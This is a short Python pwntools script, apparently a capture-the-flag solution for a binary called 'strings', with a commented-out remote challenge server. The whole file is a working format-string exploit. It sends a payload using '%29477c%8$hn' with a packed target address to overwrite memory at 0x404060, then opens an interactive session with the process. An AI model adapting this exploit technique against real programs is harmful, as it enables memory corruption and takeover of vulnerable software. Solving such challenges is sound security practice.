#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("strings")
p = process("./strings")
# gdb.attach(p,'''b*0x401297\nc''')
#p = remote('challs.n00bzunit3d.xyz', 7150)

elf = context.binary = ELF('./strings', checksec=False)

str = 0x404060
payload = b'%29477c%8$hn    ' + p64(str) # %s <-> %29477c%8$hn
p.sendline(payload)
p.interactive()